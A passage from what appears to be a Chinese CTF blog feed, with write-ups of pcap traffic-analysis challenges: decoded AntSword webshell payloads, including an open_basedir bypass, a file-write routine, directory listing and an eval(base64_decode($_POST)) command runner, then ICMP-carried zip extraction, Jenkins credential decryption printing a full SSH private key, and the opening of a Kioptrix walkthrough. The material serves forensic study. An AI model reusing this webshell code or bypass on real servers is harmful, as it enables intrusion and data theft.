class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.573ef8c9dd12&quot;</span>;@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;<span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);&#125;;@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> @<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>);&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="keyword">echo</span> <span class="string">&quot;fb70&quot;</span>.<span class="string">&quot;8664&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;870b9&quot;</span>.<span class="string">&quot;83ed5&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;idb82191cedb24&quot;</span>],<span class="number">2</span>));<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;e748c4dcd196bb&quot;</span>];<span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));<span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p> 逻辑大概理一下就好了，有些代码的含义可以参考<a class="link" href="https://www.freebuf.com/articles/web/264896.html">蚁剑流量分析及改造 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>主要关注的信息是echo和代码里面涉及到的参数（例如idb82191cedb24，e748c4dcd196bb），对应着输出和执行代码。输出最重要的是<code>echo &quot;fb70&quot;.&quot;8664&quot;;echo @asenc($output);echo &quot;870b9&quot;.&quot;83ed5&quot;;</code>，其中最重要的是<code>$output的输出</code>（也就是我们需要关注<code>ob_start()后面的echo的内容</code>）；参数最重要的点就是，一般来说会从第三个字符开始截取，经常可以看见例如：<code>base64_decode(substr($_POST[&quot;idb82191cedb24&quot;],2))</code>，进行base64解码的时候要注意代码中对于这个参数的截取是全部还是从第三个字符开始。</p>
<p>这里参数的值，idb82191cedb24经过base64解码（注意substr）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">idb82191cedb24: /www/wwwroot/DAS202310.com/ezbase</span><br><span class="line">e748c4dcd196bb: 就是elf那堆hex</span><br></pre></td></tr></table></figure></div>

<p><strong>可见这个代码功能主要是把elf存为ezbase这个文件</strong></p>
<p>返回的内容是<code>fb708664MQ==870b983ed5</code>，根据<code>echo &quot;fb70&quot;.&quot;8664&quot;;echo @asenc($output);echo &quot;870b9&quot;.&quot;83ed5&quot;;</code>知道我们需要关注的是中间的$output，也就是这里的==所在的位置（只是说明我们需要关注的位置，并不是说<code>==</code>这个内容很重要）</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321155207237.png" alt="image-20240321155207237"></p>
<p><strong>tcp.stream eq 1:</strong> 同样的思路先把php代码解码出来：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">/www/wwwroot/DAS202310.com/ <span class="comment">#这是idb82191cedb24的值，是一个文件路径</span></span><br><span class="line">.............................................(省略)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;8a90e&quot;</span>.<span class="string">&quot;52a85&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;6a1&quot;</span>.<span class="string">&quot;62ad&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$D</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;idb82191cedb24&quot;</span>],<span class="number">2</span>));<span class="variable">$F</span>=@<span class="title function_ invoke__">opendir</span>(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==<span class="literal">NULL</span>)&#123;<span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=<span class="literal">NULL</span>;<span class="variable">$L</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(<span class="variable">$N</span>=@<span class="title function_ invoke__">readdir</span>(<span class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@<span class="title function_ invoke__">filemtime</span>(<span class="variable">$P</span>));@<span class="variable">$E</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">base_convert</span>(@<span class="title function_ invoke__">fileperms</span>(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);<span class="variable">$R</span>=<span class="string">&quot;  &quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;	&quot;</span>.@<span class="title function_ invoke__">filesize</span>(<span class="variable">$P</span>).<span class="string">&quot;	&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;<span class="keyword">if</span>(@<span class="title function_ invoke__">is_dir</span>(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="keyword">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@<span class="title function_ invoke__">closedir</span>(<span class="variable">$F</span>);&#125;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div>

<p>$output的结果是目录底下文件的信息，包括名称，创建时间，大小，权限这些信息</p>
<p>来看返回的结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8a90e52a85Li8JMjAyMy0wOS0yNiAxOTowMjoyNAkxNTgJMDc1NQouLgkxOTcwLTAxLTAxIDA4OjAwOjAwCQkwCi51c2VyLmluaQkyMDIzLTA5LTI2IDE1OjI4OjI1CTQ2CTA2NDQKaW5kZXguaHRtbAkyMDIzLTA5LTI2IDE1OjI4OjI1CTkxNwkwNzU1CjQwNC5odG1sCTIwMjMtMDktMjYgMTU6Mjg6MjUJNDc5CTA3NTUKLmh0YWNjZXNzCTIwMjMtMDktMjYgMTU6Mjg6MjUJMQkwNzU1CnNoZWxsLnBocAkyMDIzLTA5LTI2IDE2OjI2OjIxCTUwCTA2NDQKZmxhZy50eHQJMjAyMy0wOS0yNiAxNzoxODoyMwkzOAkwNjQ0CkljZVRlYS5jYXAJMjAyMy0wOS0yNiAxOTowMjoxMwkwCTA2NDQKZXpiYXNlCTIwMjMtMDktMjYgMTk6MDI6MjQJMjc4NjQJMDc3NwpJQ0VfVEVBLnR4dAkyMDIzLTA5LTI2IDE3OjM0OjUxCTUyCTA2NDQK6a162ad</span><br></pre></td></tr></table></figure></div>

<p>把前后的echo内容：8a90e52a85和6a162ad去掉后，中间的部分就是$output，解码后得到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./  2023-09-26 19:02:24	158	0755</span><br><span class="line">..  1970-01-01 08:00:00		0</span><br><span class="line">.user.ini  2023-09-26 15:28:25	46	0644</span><br><span class="line">index.html  2023-09-26 15:28:25	917	0755</span><br><span class="line">404.html  2023-09-26 15:28:25	479	0755</span><br><span class="line">.htaccess  2023-09-26 15:28:25	1	0755</span><br><span class="line">shell.php  2023-09-26 16:26:21	50	0644</span><br><span class="line">flag.txt  2023-09-26 17:18:23	38	0644</span><br><span class="line">IceTea.cap  2023-09-26 19:02:13	0	0644</span><br><span class="line">ezbase  2023-09-26 19:02:24	27864	0777</span><br><span class="line">ICE_TEA.txt  2023-09-26 17:34:51	52	0644</span><br></pre></td></tr></table></figure></div>

<p>可以看到这个目录结构，里面存了一个flag.txt和ICE_TEA.txt，以及之前存下的elf——ezbase</p>
<p><strong>tcp.stream eq 3:</strong>  </p>
<p><code>cmd=%40eval(%40base64_decode(%24_POST%5B&#39;v58ffabfc37579&#39;%5D))%3B</code>注意这里要提取的参数是<code>v58ffabfc37579</code>，找到后，base64解码一下（以下内容只保留关键部分）</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1f6dc&quot;</span>.<span class="string">&quot;d210b5&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;a52&quot;</span>.<span class="string">&quot;ea3d&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;k275f4d770f3a3&quot;</span>],<span class="number">2</span>));<span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;dd6f4eedea78f3&quot;</span>],<span class="number">2</span>));<span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;gde84aa25ae3d4&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure></div>

<p>依次解码提到的几个参数，注意substr的截取：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">k275f4d770f3a3: /bin/sh</span><br><span class="line"></span><br><span class="line">dd6f4eedea78f3: cd &quot;/www/wwwroot/DAS202310.com&quot;;./ezbase e flag.txt IceTea.txt;echo 27d667b0c949;pwd;echo f0e52b6ed</span><br><span class="line"></span><br><span class="line">gde84aa25ae3d4截取后是空的</span><br></pre></td></tr></table></figure></div>

<p>显然dd6f4eedea78f3这个参数内容是执行的shell命令，<code>/ezbase e flag.txt IceTea.txt</code> 这句应该是对flag.txt进行base64换表加密，密文保存在IceTea.txt中。</p>
<p><strong>tcp.stream eq 4:</strong></p>
<p>php代码参数是k59c2ae7730483</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;7db&quot;</span>.<span class="string">&quot;35e&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;f6957c&quot;</span>.<span class="string">&quot;a6229b&quot;</span>;&#125;<span class="title function_ invoke__">ob_start</span>();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;k275f4d770f3a3&quot;</span>],<span class="number">2</span>));<span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;dd6f4eedea78f3&quot;</span>],<span class="number">2</span>));<span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;gde84aa25ae3d4&quot;</span>],<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<p>参数解码，注意substr：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">k275f4d770f3a3: /bin/sh</span><br><span class="line"></span><br><span class="line">dd6f4eedea78f3: cd &quot;/www/wwwroot/DAS202310.com&quot;;cat IceTea.txt;echo 27d667b0c949;pwd;echo f0e52b6ed</span><br><span class="line"></span><br><span class="line">gde84aa25ae3d4截取后是空的</span><br></pre></td></tr></table></figure></div>

<p>“掐头去尾”后，base64 解码，得到输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reftqRrg4QB9zvZQzwf50xn51CZQxSf51gZPzxj5zhjF1CI75qE=27d667b0c949</span><br><span class="line">/www/wwwroot/DAS202310.com</span><br><span class="line">f0e52b6ed</span><br></pre></td></tr></table></figure></div>

<p><code>reftqRrg4QB9zvZQzwf50xn51CZQxSf51gZPzxj5zhjF1CI75qE=</code>就是<code>cat IceTea.txt</code>的输出内容</p>
<ul>
<li>接下来问题就是<code>reftqRrg4QB9zvZQzwf50xn51CZQxSf51gZPzxj5zhjF1CI75qE=</code>的base64换表解密，丢给cyberchef，表我们早就拿到了</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321162650830.png" alt="image-20240321162650830"></p>
<ul>
<li>flag ：<code>DASCTF&#123;Ice_tea_is_not_a_loser_drink!&#125;</code></li>
</ul>
<p><em>很愉快的一次蚁剑流量分析，因此这道题wp也写的挺多的</em></p>
<h4 id="0x07-2022DASCTF-X-SU-三月春季挑战赛-Hi-Hecker"><a href="#0x07-2022DASCTF-X-SU-三月春季挑战赛-Hi-Hecker" class="headerlink" title="0x07 [2022DASCTF X SU 三月春季挑战赛]Hi!Hecker!"></a>0x07 [2022DASCTF X SU 三月春季挑战赛]Hi!Hecker!</h4><ul>
<li><p>icmp流量分析+git知识，长了一些经验教训。git部分已经失效无法复现，重点掌握icmp数据处理。</p>
</li>
<li><p>很明显可以看到icmp的data里面是有数据的，过滤规则<code>icmp.resp_to</code>只过滤reply包</p>
</li>
<li><p>length排序后，发现有600长度的数据包，显然就不正常，发现里面有<code>504b0506</code>是zip尾部，这个时候seq=8，再搜索一下<code>504b0304</code>发现在seq=1的包里，所以<strong>整个压缩包文件的传递是从seq=1到seq=8。</strong>对应的过滤规则为：<code>icmp.resp_to &amp;&amp; icmp.seq&lt;9</code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321190745562.png" alt="image-20240321190745562"></p>
<ul>
<li>tshark 按照指定过滤规则提取，并且去除掉开头的重复数据<code>41d88d144</code></li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;Hi！Hacker.pcapng&quot; -Y &#x27;icmp.resp_to &amp;&amp; icmp.seq &lt; 9&#x27; -T fields -e &quot;data.data&quot; |sed &#x27;s/41d.*beef//g&#x27;|sed &#x27;s/1337133711333377//g&#x27;|tr -d &#x27;\n&#x27;&gt; 1.txt</span><br></pre></td></tr></table></figure></div>

<p>sed 一定要同时关注头部和尾部的多余信息，而且可能多余信息包与包之间不同，但是位数一般是一样的，比如这里（借用一下别人的图）头部多余数据是<code>41d88d144...deadbeef</code>这一长串，而且包与包之间这一串也有不相同的部分，这一点要特别注意，可以看见删除之后504b0304这个zip头就出来了；尾部的多余数据很好发现，就是<code>1337133711333377</code></p>
<p>最好删掉\n，否则下一步容易出问题。你可以先不加，来更好的观察多余数据，但16进制转储的时候最好删掉。</p>
<p><em>在数据处理的时候一定要细心啊😭</em></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321203905610.png" alt="image-20240321203905610"></p>
<ul>
<li>拿到txt之后丢进cyberchef里面，把保存输出为<code>Hecker.zip</code>文件。或者用xxd：<code>cat 1.txt |xxd -r -p &gt;hecker2.zip 。</code><em>不删换行的话这里cyberchef可能output数据会报错：Data is not a valid byteArray: [80,75,3,4,10,0,0,0,0,…；xxd转储出来的文件也可能会有问题</em></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321204407639.png" alt="image-20240321204407639"></p>
<ul>
<li>拿到的zip结构如下：</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321204433444.png" alt="image-20240321204433444"></p>
<p>如果你的多余数据删除的不正确，是无法靠binwalk分离出所有的文件的，亲测会缺斤少两</p>
<ul>
<li>经过搜索<code>jenkins</code>，找到了解密的工具：<a class="link" href="https://github.com/hoto/jenkins-credentials-decryptor">hoto/jenkins-credentials-decryptor：用于转储 Jenkins 凭据的命令行工具。 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>这些文件我们都有，更加印证了，应该使用这个工具解密</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321204624460.png" alt="image-20240321204624460"></p>
<ul>
<li>安装后，直接输入命令</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321205352843.png" alt="image-20240321205352843"></p>
<p>输出结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">        username: git</span><br><span class="line">        usernameSecret: false</span><br><span class="line">        privateKeySource: </span><br><span class="line">        privateKey: -----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAtzlKieML/0Tx0BJe15gk/afiGikfhN4FP7BSaqdP74gcjre/nAsI</span><br><span class="line">Ydl/TOVDd9OpG7hwOTUZnITF9j/jzT32HIhek9oqxLFVQT59zqN1ZDIZmhSVMNRWqWw3/q</span><br><span class="line">vF9OHneBShkC1r63g/W57chXU6Lg8jWyC+UycgAJOlsEPhuTb2mfD75h/Nq2++CDX3g72H</span><br><span class="line">eHQFEJYqDYZmeQOmRV+GmNuVKWXnG0EkyT/MZ+0sqxU022eX4Nn5DhwKO79zfjpaAN9z9a</span><br><span class="line">iCmVqeZLMVJZEuZ9s7MwrQ/tN8ov3lvG2QF5EafAoetgj1sKr65YnojT9K3Cn27S4Sl41I</span><br><span class="line">PVJtCUOxGc9QUmjPH3L7h4Tfy8lPwyl65jWgx/BHDvuco3f0/jYFqw2xVEORwuED93MnaA</span><br><span class="line">IooUY2hUAVAVupY3MaByn2cPnZa6Ujhs6jr2+UKQPfAysnIWA9Gnr/IH8xzzujt9Fg1zdl</span><br><span class="line">qmirVsw+eKi070HbZbDtdKbV3ob/smaqZ6lnvKzXAAAFiNRQaKnUUGipAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALc5SonjC/9E8dASXteYJP2n4hopH4TeBT+wUmqnT++IHI63v5wLCGHZf0zlQ3fT</span><br><span class="line">qRu4cDk1GZyExfY/48099hyIXpPaKsSxVUE+fc6jdWQyGZoUlTDUVqlsN/6rxfTh53gUoZ</span><br><span class="line">Ata+t4P1ue3IV1Oi4PI1sgvlMnIACTpbBD4bk29pnw++Yfzatvvgg194O9h3h0BRCWKg2G</span><br><span class="line">ZnkDpkVfhpjblSll5xtBJMk/zGftLKsVNNtnl+DZ+Q4cCju/c346WgDfc/WogplanmSzFS</span><br><span class="line">WRLmfbOzMK0P7TfKL95bxtkBeRGnwKHrYI9bCq+uWJ6I0/Stwp9u0uEpeNSD1SbQlDsRnP</span><br><span class="line">UFJozx9y+4eE38vJT8MpeuY1oMfwRw77nKN39P42BasNsVRDkcLhA/dzJ2gCKKFGNoVAFQ</span><br><span class="line">FbqWNzGgcp9nD52WulI4bOo69vlCkD3wMrJyFgPRp6/yB/Mc87o7fRYNc3Zapoq1bMPnio</span><br><span class="line">tO9B22Ww7XSm1d6G/7JmqmepZ7ys1wAAAAMBAAEAAAGAO0ci0XeOgxj4LvwyiQflN9ef9B</span><br><span class="line">zH4MG/6voNwAm/d9yOeLIEIOUE4jtuzx8Bc/wboydJz4hZb+UY8vF6rwVT4alRB/62hYpl</span><br><span class="line">7cTdCQSjTzZSSCJOnkykeQ3VE+TZF8AaliP+nVnEp5rwzKCZ8eeaWhp1st7mFJr85JLgMS</span><br><span class="line">XVGooowGdR6AL0FHoDfj6PhKTF9nd6yAH9OwD3mEFRAvLD5iJsoMciPRQXZbDpXdpC8Frd</span><br><span class="line">Dfr3DT0YMbNqsCfhor4XoioPpufNisF1BFyx+Gv7M+qj7RW1RRfG5/LxRqCUx7eCjkPXr2</span><br><span class="line">l777fOVsnOTcIEea9NTjdD/tacmvAgzj4jcMgnJmcQ46uAaQame1mPuanb8xMXj+Hmbtv3</span><br><span class="line">Oet19bEmEuZiKOQuBPrwAhC/m2bhSPQyQcYbtfMVUCpakVp73y4+5o6CCx6sQJ4mCJZ25J</span><br><span class="line">28AXC4tibWHJVtyceB8pP/KZri+vEaYfeCOVl756H8+QjrItlGs7BfDUa9cwwbGBThAAAA</span><br><span class="line">wHSyot2RhNL4R6T0xFEMg8DT62U44IiME9xWZUnQ2xvjYApcLN4ekD8kWF+CLe64eMie2j</span><br><span class="line">I/veZUjRj++va+1SEzXIPOZfq17xNRPr6IvOhiE1cG9EcmFyHEVRzDKP63qf7VhMkMYl2W</span><br><span class="line">UENdNAjvv/QMlEXluhpFdOVVwp/5dtcXmU6tXZRtONsNbKAXRC9mdYVS/bueVRQ1EfVRo1</span><br><span class="line">+iFzM+vIBbZsbrhGW1azJlwfBi3246NKdNhO8pgUnJ2Cb2vgAAAMEA31y2aFETbHi0jtdT</span><br><span class="line">scjJ+MnFkwe2T84ryGNBuI5N+5N1ak8zBDf0FIicWisLdVHpZBReTnCvAhO8B2782HaLkp</span><br><span class="line">beidDDsO7s34bixoIeAQ0nDpVEDh6EKAj3bKZu7O76Ka6YqpE/sHNBe7gS7ARFLTuqrZEN</span><br><span class="line">G6LoGK3S+7p4kAiAfM6iK9X9tbdWt67zKGF3RjB0OZb1iuyBuQNo087DRkB/J227NXBzZ+</span><br><span class="line">TazxuPVPPxM/tB6T89MQli0ZKkik/xAAAAwQDR/yBmgb9WnxmW3GpsVXd5tQM3pqOaQNoA</span><br><span class="line">y5KrmkBznmEoNOoiTj5EG4jtoAZOdeh1FKePpxxANvGG4ehw2nSpHc+BZ4dcKLTI6qPbGp</span><br><span class="line">rk0+bUPslUZOmdEEwo0RD8gmPrwowVsTkTzkDb/3IUDg8dMFWn5C+PGE27KD/XFUMC1RgD</span><br><span class="line">xNWJwrLCER6DTbUceT54KTPgsOPJz0T9cNK0g0CjqobdiE5H2d16zORpOKdtYatfj9/FC3</span><br><span class="line">RYExoL7yipkUcAAAANa2FsaUBFc29uaHVnaAECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">        scope: GLOBAL</span><br><span class="line">        id: 1</span><br><span class="line">        description: github project sshkeys</span><br><span class="line">1</span><br><span class="line">        description: </span><br><span class="line">        secret: hint1: hints.eson.ninja</span><br><span class="line">        scope: GLOBAL</span><br><span class="line">        id: 2</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>把内容保存为ssh key文件，记得格式问题，我一直尝试删除换行符那些，但还是显示invalid format，我也不知道问题出现在哪里，key的内容我直接复制这个wp中给出来的：<a class="link" href="https://forum.butian.net/share/1464">https://forum.butian.net/share/1464 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>Ssh-add 把私钥加进去</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321220602015.png" alt="image-20240321220602015"></p>
</li>
<li><p>wireshark 里面tcp的流中有一段显示了他的github地址：<code>Esonhugh/secret_source_code</code></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321220647814.png" alt="image-20240321220647814"></p>
<ul>
<li>git clone 下来，但是由于过去太久了，出题人应该已经删库了</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321220917415.png" alt="image-20240321220917415"></p>
<ul>
<li>后续我看别人写的wp，clone下来没什么东西，flag在上一个版本里面，要恢复上一个版本</li>
<li>这题的wp也很少，剩下步骤请查看：</li>
</ul>
<blockquote>
<p><a class="link" href="https://forum.butian.net/share/1464">https://forum.butian.net/share/1464 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>[2022DASCTF X SU 三月春季挑战赛 WriteUp_2022dasctf x su 三月春季挑战赛 web calc<a class="link" href="https://blog.csdn.net/qq_42880719/article/details/123763744">atao]-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><em>好难啊😭</em></p>
<p><strong>关于icmp我长教训了</strong>：</p>
<ul>
<li><strong>length排序一下，看看有没有特殊的数据包（因为这种数据包的时间顺序(No大小就代表时间顺序)和seq顺序可能不一致，这样会导致一些关键数据错位或者夹杂一些别的数据影响文件提取）；</strong></li>
<li><strong>或者在binwalk发现数据内含有压缩包的时候，去查找一下数据包的位置，可以直接搜索<code>504b0304</code>查找zip的头，再搜索<code>504b0506</code>查找一下zip的尾部，一定要确保zip里面的数据完整且顺序正确；</strong></li>
<li><strong>还有一个重要的点是icmp经常会出现头部和尾部出现多余数据的情况，每个包的多余数据要删除掉，要仔细观察多余数据通常位数相同但是不一定完全相同，一定要仔细观察！！！；</strong></li>
<li><strong>tshark提取，特别是涉及到这种16进制，一定要记得<code>tr -d &#39;\n&#39;</code>删掉末尾的\n，否则cyberchef的from hex是不能像from base64一样移除不符合规则的字符的</strong></li>
</ul>
<p><em>我就是因为没确认zip位置也发现头部和尾部完整的多余数据，导致binwalk分析出现问题，也无法正确解密</em></p>
]]></content>
      <categories>
        <category>CTF做题记录</category>
      </categories>
      <tags>
        <tag>MISC-流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 1</title>
    <url>/2024/01/29/Kioptrix_Level_1/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h1><blockquote>
<p>参考 <a class="link" href="https://www.cnblogs.com/jarwu/p/17240815.html">Walkthrough-KIOPTRIX LEVEL1 - Jarwu - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li>nmap扫描附近存活主机ip</li>
</ul>
